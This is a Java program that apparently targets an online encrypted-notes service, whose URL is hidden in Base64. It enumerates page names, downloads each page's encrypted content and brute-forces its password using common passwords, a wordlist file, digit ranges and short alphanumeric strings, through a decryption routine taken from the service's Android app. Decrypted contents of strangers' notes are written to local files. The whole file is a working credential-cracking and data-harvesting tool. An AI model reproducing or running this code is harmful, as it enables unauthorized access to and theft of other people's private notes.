package com.test;

import org.apache.commons.io.FileUtils;
import org.apache.commons.io.FilenameUtils;
import org.apache.commons.io.IOUtils;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.util.*;

public class Test {

    private static String decrypt(String key, String input, String pass) {
        try {
            String hash = com.protectedtext.android.other.e.b("/" + key);
            String decrypted = com.protectedtext.android.other.e.a(input, pass);
            String hash2 = decrypted.substring(decrypted.length() - 128, decrypted.length());
            if (!hash.equals(hash2)) return null;
            return decrypted.substring(0, decrypted.length() - 128);
        } catch (Exception e) {
            return null;
        }
    }

    public static void main(String[] args) throws IOException {
        if (args.length > 0 && args[0].startsWith("#")) {
            allNumbers(args);
            return;
        }
        if (args.length > 0 && args[0].startsWith("-")) {
            allWords(args);
            return;
        }
        if (args.length > 0 && args[0].startsWith("$")) {
            allLetters(args);
            return;
        }
        if (args.length > 0 && args[0].startsWith("@")) {
            reCheck(args);
            return;
        }
        String key = "5562";
        if (args.length > 0 && args[0].startsWith("/")) key = args[0].substring(1);
        System.out.println(key);
//        String input = "U2FsdGVkX1/retZYMVtpN4EiZRR1k7kWOIfo8jcM6bfFbbALfO4p/fwptqnWGBzCIycZeqE7hP/z/c6onJQSNgWLaDPYXexv+yik0OeNJKL4gxqJhnk0vYTKDyv5JugKsAknCDMBIF+h0aA38y7j+YqB7tzLW0BoAPzpYZ8c69rEJGr4j/pri6f1dgxyMQ5rlX7HayUYi8yItiUo1HD3OwxGx03+cdCTdYG/pxeSO30QJKMDQNqKGX10pRAJ86w0vxyx74j2gDCjr/oTnbB3Xw==";
//        String pass = "009";
//        String ss = decrypt(pass, input,pass);
//        System.out.println(ss);

//        String a1 = com.protectedtext.android.other.e.a(input, "009");
//        String a2 = a1.substring(a1.length() - 128, a1.length());
//        String a3 = com.protectedtext.android.other.e.b("/009");
//        System.out.println(a2);
//        System.out.println(a2);
//        System.out.println(a1);
//        if (true) return;

        String input;
        if (args.length > 1 && !args[1].startsWith("/")) {
            input = args[1];
        } else {
            String url = new String(Base64.getDecoder().decode("aHR0cHM6Ly93d3cucHJvdGVjdGVkdGV4dC5jb20v"), StandardCharsets.UTF_8) + key;
            String response = httpGet(url);
            int start = response.indexOf("new ClientState(") + "new ClientState(".length();
            int end = response.indexOf(")", start);
            String c = response.substring(start, end);
            String c1 = c.split(",")[1];
            input = c1.replace("\"", "").trim();
        }
        System.out.println(input);

        boolean skipNumber = false;
        if (args.length > 1 && args[1].equals("/s") || args.length > 2 && args[2].equals("/s")) {
            skipNumber = true;
            System.out.println("skipNumber = true");
        }

        if (input.isEmpty()) {
            System.out.println();
            System.out.println("<empty>");
        } else {
            String resultKey = null;
            String resultContent = null;
            block_1:
            {
                {
                    List<String> list = new ArrayList<>();
                    list.add("");
                    list.add(key);
                    list.add(" ");
                    list.add("  ");
                    list.add("   ");
                    list.add("123456");
                    list.add("1234567");
                    list.add("12345678");
                    list.add("123456789");
                    list.add("1234567890");
                    list.add("1234567890qwe");
                    list.add("1234567890asd");
                    list.add("123456789qwe");
                    list.add("123456789asd");
                    list.add("asd");
                    list.add("qwe");
                    list.add("asdasd");
                    list.add("qweqwe");
                    list.add("qweasd");
                    list.add("1qaz");
                    for (String k : list) {
                        resultContent = decrypt(key, input, k);
                        if (resultContent != null) {
                            resultKey = k;
                            break block_1;
                        }
                    }
                }
                {
                    String map = FileUtils.readFileToString(new File("map.txt"), StandardCharsets.UTF_8);
                    String[] array = map.split("\n");
                    int arrayLength = array.length;
                    for (int i = 0; i < arrayLength; i++) {
                        String k = array[i].replace("-", "").toLowerCase();
                        if (i % 100000 == 0) System.out.println(i + " / " + k);
                        resultContent = decrypt(key, input, k);
                        if (resultContent != null) {
                            resultKey = k;
                            break block_1;
                        }
                    }
                }
                if (!skipNumber) {
                    int digit = 1;
                    long i = 0;
                    while (i < 100000000L && digit < 9) {
                        String k = Long.toString(i);
                        if (k.length() < digit) {
                            String padding = "";
                            for (int j = 0; j < digit - k.length(); j++) {
                                padding += "0";
                            }
                            k = padding + k;
                            if (i % 100000 == 0) System.out.println(i + " / " + k);
                            i++;
                        } else if (Long.toString(i).length() < Long.toString(i + 1).length()) {
                            i = 0;
                            digit++;
                        } else {
                            if (i % 100000 == 0) System.out.println(i + " / " + k);
                            i++;
                        }
                        resultContent = decrypt(key, input, k);
                        if (resultContent != null) {
                            resultKey = k;
                            break block_1;
                        }
                    }
                }
                {
                    char[] array = "0123456789abcdefghijklmnopqrstuvwxyz".toCharArray();
                    int arrayLength = array.length;
                    int length = 1;
                    while (length < 7) {
                        long i = 0;
                        while (true) {
                            long temp = i;
                            StringBuilder str = new StringBuilder();
                            if (temp == 0) str.insert(0, array[0]);
                            while (temp != 0) {
                                int tempValue = (int) (temp % arrayLength);
                                str.insert(0, array[tempValue]);
                                temp /= arrayLength;
                            }
                            String k = str.toString();
                            if (k.length() > length) break;
                            else if (k.length() < length) {
                                String padding = "";
                                for (int j = 0; j < length - k.length(); j++) {
                                    padding += array[0];
                                }
                                k = padding + k;
                            }
                            if (i % 100000 == 0) System.out.println(i + " / " + k);
                            i++;
                            resultContent = decrypt(key, input, k);
                            if (resultContent != null) {
                                resultContent = resultContent.replaceAll("f47c13a09bfcad9eb1f81fbf12c04516e0d900e409a74c660f933e69cf93914e16bc9facc7d379a036fe71468bd4504f2a388a0a28a9b727a38ab7843203488c", "\n\n================================================================\n\n");
                                resultKey = k;
                                break block_1;
                            }
                        }
                        length++;
                    }
                }
            }
            System.out.println();
            System.out.println(resultKey);
            System.out.println("================================");
            System.out.println(resultContent);
            System.out.println("================================");
            System.out.println(resultKey);
        }
    }

    private static String[] getKeyArray() {
        List<String> list = new ArrayList<>();
        for (int digit = 1; digit <= 8; digit++) {
            int i = 0;
            while (true) {
                String key = Integer.toString(i);
                if (key.length() > digit) break;
                if (key.length() < digit) {
                    String padding = "";
                    for (int j = 0; j < digit - key.length(); j++) {
                        padding += "0";
                    }
                    key = padding + key;
                }
                list.add(key);
                i++;
            }
        }
        return list.toArray(new String[]{});
    }

    private static String[] wordArray;

    static {
        try {
            String map = FileUtils.readFileToString(new File("map.txt"), StandardCharsets.UTF_8);
            wordArray = map.split("\n");
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private static void allNumbers(String[] args) {
        int digit = 3;
        int maxDigit = 5;
        long i = 0;
        long max = (long) Math.pow(10, maxDigit);
        if (args.length > 0 && args[0].startsWith("#") && args[0].length() > 1) {
            digit = Integer.parseInt(args[0].substring(1));
            maxDigit = digit;
            max = (long) Math.pow(10, maxDigit);
            if (args.length > 1) i = Long.parseLong(args[1]);
            if (args.length > 2) max = Long.parseLong(args[2]);
        }
        int succeedCount = 0;
        while (i < max && digit <= maxDigit) {
            String key = Long.toString(i);
            if (key.length() < digit) {
                String padding = "";
                for (int j = 0; j < digit - key.length(); j++) {
                    padding += "0";
                }
                key = padding + key;
                i++;
            } else if (Long.toString(i).length() < Long.toString(i + 1).length()) {
                i = 0;
                digit++;
            } else {
                i++;
            }
            System.out.println("(" + (i + 1) + " / " + max + " / " + succeedCount + " succeed)    " + key);
            if (checkWithKey(key)) succeedCount++;
        }
    }

    private static void allWords(String[] args) throws IOException {
        String keyPrefix = null;
        if (args.length > 0 && args[0].startsWith("-")) keyPrefix = args[0].substring(1);
        List<String> resultKeyList = new ArrayList<>();
        for (String s : wordArray) {
            String key = s.replace("-", "").toLowerCase();
            if (key.length() < 3) continue;
            if (keyPrefix != null && !key.startsWith(keyPrefix)) continue;
            if (resultKeyList.contains(s)) continue;
            resultKeyList.add(s);
        }
        int count = resultKeyList.size();
        int succeedCount = 0;
        for (int ix = 0; ix < count; ix++) {
            String key = resultKeyList.get(ix);
            System.out.println("(" + (ix + 1) + " / " + succeedCount + " / " + count + ")  " + key);
            if (checkWithKey(key)) succeedCount++;
        }
    }

    private static void allLetters(String[] args) {
        int length = 3;
        int maxLength = 3;
        if (args.length > 0 && args[0].startsWith("$") && args[0].length() > 1) {
            length = Integer.parseInt(args[0].substring(1));
            maxLength = length;
        }
        char[] array = "abcdefghijklmnopqrstuvwxyz0123456789".toCharArray();
        int arrayLength = array.length;
        long maxCount = (long) Math.pow(10, maxLength);
        int succeedCount = 0;
        while (length <= maxLength) {
            int i = 0;
            while (true) {
                long temp = i;
                StringBuilder str = new StringBuilder();
                if (temp == 0) str.insert(0, array[0]);
                while (temp != 0) {
                    int tempValue = (int) (temp % arrayLength);
                    str.insert(0, array[tempValue]);
                    temp /= arrayLength;
                }
                String k = str.toString();
                if (k.length() > length) break;
                else if (k.length() < length) {
                    String padding = "";
                    for (int j = 0; j < length - k.length(); j++) {
                        padding += array[0];
                    }
                    k = padding + k;
                }
                System.out.println("(" + (i + 1) + " / " + maxCount + " / " + succeedCount + " succeed)    " + k);
                if (checkWithKey(k)) succeedCount++;
                i++;
            }
            length++;
        }
    }

    private static boolean checkWithKey(String key) {
        try {
            String url = new String(Base64.getDecoder().decode("aHR0cHM6Ly93d3cucHJvdGVjdGVkdGV4dC5jb20v"), StandardCharsets.UTF_8) + key;
            String response = httpGet(url).trim();
//                if (response.length() > 10 * 1024) continue;
            int start = response.indexOf("new ClientState(") + "new ClientState(".length();
            int end = response.indexOf(")", start);
            String c = response.substring(start, end);
            String c1 = c.split(",")[1];
            String input = c1.replace("\"", "").trim();
            if (input.isEmpty()) {
                System.out.println();
                System.out.println("<empty>");
            } else if (!input.startsWith("U2FsdGVkX1")) {
                String resultContent = input;
                resultContent = resultContent.replaceAll("f47c13a09bfcad9eb1f81fbf12c04516e0d900e409a74c660f933e69cf93914e16bc9facc7d379a036fe71468bd4504f2a388a0a28a9b727a38ab7843203488c", "\n\n================================================================\n\n");
                System.out.println("OK : " + key + " / <empty>  (" + resultContent.length() + ")");
                File outputFile = new File("words/" + key.replaceAll("[\\\\/:*?\"<>|]", "_") + ".txt");
                FileUtils.writeStringToFile(outputFile, resultContent, StandardCharsets.UTF_8);
                return true;
            } else {
                String resultKey = null;
                String resultContent = null;
                block_1:
                {
                    {
                        List<String> list = new ArrayList<>();
                        list.add("");
                        list.add(key);
                        list.add(" ");
                        list.add("  ");
                        list.add("   ");
                        list.add("123456");
                        list.add("1234567");
                        list.add("12345678");
                        list.add("123456789");
                        list.add("1234567890");
                        list.add("1234567890qwe");
                        list.add("1234567890asd");
                        list.add("123456789qwe");
                        list.add("123456789asd");
                        list.add("asd");
                        list.add("qwe");
                        list.add("asdasd");
                        list.add("qweqwe");
                        list.add("qweasd");
                        list.add("1qaz");
                        list.add("qweQWE123!@#");
                        list.add("asdASD123!@#");
                        list.add("asdQWE123!@#");
                        list.add("asdqwe");
                        list.add("asdqwe123");
                        list.add("qweasd");
                        list.add("zxcasdqwe");
                        list.add("zxcasdqwe123");
                        for (String k : list) {
                            resultContent = decrypt(key, input, k);
                            if (resultContent != null) {
                                resultKey = k;
                                break block_1;
                            }
                        }
                    }
                    {
                        int arrayLength = wordArray.length;
                        for (int i = 0; i < arrayLength; i++) {
                            String k = wordArray[i].toLowerCase();
                            if (k.length() > 1) k = k.replace("-", "");
                            if (i % 100000 == 0) System.out.println(i + " / " + k);
                            resultContent = decrypt(key, input, k);
                            if (resultContent != null) {
                                resultKey = k;
                                break block_1;
                            }
                            k = k.substring(0, 1).toUpperCase() + k.substring(1);
                            resultContent = decrypt(key, input, k);
                            if (resultContent != null) {
                                resultKey = k;
                                break block_1;
                            }
                        }
                    }
                    if (response.length() < 5 * 1024) {
                        int digit = 4;
                        int i = 0;
                        while (i < 100000000L && digit < 9) {
                            String k = Integer.toString(i);
                            if (k.length() < digit) {
                                String padding = "";
                                for (int j = 0; j < digit - k.length(); j++) {
                                    padding += "0";
                                }
                                k = padding + k;
                                if (i % 100000 == 0) System.out.println(i + " / " + k);
                                i++;
                            } else if (Integer.toString(i).length() < Integer.toString(i + 1).length()) {
                                i = 0;
                                digit++;
                            } else {
                                if (i % 100000 == 0) System.out.println(i + " / " + k);
                                i++;
                            }
                            resultContent = decrypt(key, input, k);
                            if (resultContent != null) {
                                resultKey = k;
                                break block_1;
                            }
                        }
                    }
                    {
                        char[] array = "0123456789abcdefghijklmnopqrstuvwxyz".toCharArray();
                        int arrayLength = array.length;
                        int length = 1;
                        while (length < 4) {
                            int i = 0;
                            while (true) {
                                int temp = i;
                                StringBuilder str = new StringBuilder();
                                if (temp == 0) str.insert(0, array[0]);
                                while (temp != 0) {
                                    int tempValue = (int) (temp % arrayLength);
                                    str.insert(0, array[tempValue]);
                                    temp /= arrayLength;
                                }
                                String k = str.toString();
                                if (k.length() > length) break;
                                else if (k.length() < length) {
                                    String padding = "";
                                    for (int j = 0; j < length - k.length(); j++) {
                                        padding += array[0];
                                    }
                                    k = padding + k;
                                }
                                if (i % 100000 == 0) System.out.println(i + " / " + k);
                                i++;
                                resultContent = decrypt(key, input, k);
                                if (resultContent != null) {
                                    resultKey = k;
                                    break block_1;
                                }
                            }
                            length++;
                        }
                    }
                    {
                        char[] array = "0123456789abcdefghijklmnopqrstuvwxyz".toCharArray();
                        int arrayLength = array.length;
                        int length = 4;
                        while (length < 15) {
                            for (int i = 0; i < arrayLength; i++) {
                                StringBuilder str = new StringBuilder();
                                for (int j = 0; j < length; j++) {
                                    str.append(array[i]);
                                }
                                String k = str.toString();
                                resultContent = decrypt(key, input, k);
                                if (resultContent != null) {
                                    resultKey = k;
                                    break block_1;
                                }
                            }
                            length++;
                        }
                    }
                }
                if (resultKey != null && !resultContent.contains("7857b37d1ddf75f3")) {
                    resultContent = resultContent.replaceAll("f47c13a09bfcad9eb1f81fbf12c04516e0d900e409a74c660f933e69cf93914e16bc9facc7d379a036fe71468bd4504f2a388a0a28a9b727a38ab7843203488c", "\n\n================================================================\n\n");
                    System.out.println("OK : " + key + " / " + resultKey + "  (" + resultContent.length() + ")");
                    File outputFile = new File("words/" + key.replaceAll("[\\\\/:*?\"<>|]", "_") + ".txt");
                    FileUtils.writeStringToFile(outputFile, resultKey + "\n\n================================================================\n\n" + resultContent, StandardCharsets.UTF_8);
                    return true;
                } else {
                }
            }
            System.out.println("================================");
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    private static void reCheck(String[] args) {
        File dir = new File("ok2");
        File[] files = dir.listFiles();
        int fileCount = files.length;
        for (int i = 0; i < fileCount; i++) {
            System.out.println((i + 1) + " / " + fileCount);
            File f = files[i];
            if (f.isDirectory()) {
                System.out.println("directory: " + f);
                continue;
            }
            try {
                String text = FileUtils.readFileToString(f, StandardCharsets.UTF_8);
                String key = FilenameUtils.removeExtension(f.getName());
                String password = text.split("\\n\\n================================================================\\n\\n")[0];

                String url = new String(Base64.getDecoder().decode("aHR0cHM6Ly93d3cucHJvdGVjdGVkdGV4dC5jb20v"), StandardCharsets.UTF_8) + key;
                String response = httpGet(url).trim();
                int start = response.indexOf("new ClientState(") + "new ClientState(".length();
                int end = response.indexOf(")", start);
                String c = response.substring(start, end);
                String c1 = c.split(",")[1];
                String input = c1.replace("\"", "").trim();
                if (input.isEmpty()) {
                    System.out.println(key + "\t" + password + "\t" + "<empty>");
                } else if (!input.startsWith("U2FsdGVkX1")) {
                    String resultContent = input;
                    resultContent = resultContent.replaceAll("f47c13a09bfcad9eb1f81fbf12c04516e0d900e409a74c660f933e69cf93914e16bc9facc7d379a036fe71468bd4504f2a388a0a28a9b727a38ab7843203488c", "\n\n================================================================\n\n");
                    System.out.println(key + "\t" + password + "\t" + "OK : " + " / <empty>  (" + resultContent.length() + ")");
                    File outputFile = new File("words/" + key.replaceAll("[\\\\/:*?\"<>|]", "_") + ".txt");
                    FileUtils.writeStringToFile(outputFile, resultContent, StandardCharsets.UTF_8);
                } else {
                    String decrypted = decrypt(key, input, password);
                    if (decrypted != null) {
                        decrypted = decrypted.replaceAll("f47c13a09bfcad9eb1f81fbf12c04516e0d900e409a74c660f933e69cf93914e16bc9facc7d379a036fe71468bd4504f2a388a0a28a9b727a38ab7843203488c", "\n\n================================================================\n\n");
                        System.out.println(key + "\t" + password + "\t" + "OK : " + "  (" + decrypted.length() + ")");
                        File outputFile = new File("words/" + key.replaceAll("[\\\\/:*?\"<>|]", "_") + ".txt");
                        FileUtils.writeStringToFile(outputFile, password + "\n\n================================================================\n\n" + decrypted, StandardCharsets.UTF_8);
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private static String httpGet(String url) throws IOException {
        URL u = new URL(url);
        URLConnection yc = u.openConnection();
        BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream()));
        String result = IOUtils.toString(in);
        in.close();
        return result;
    }

}
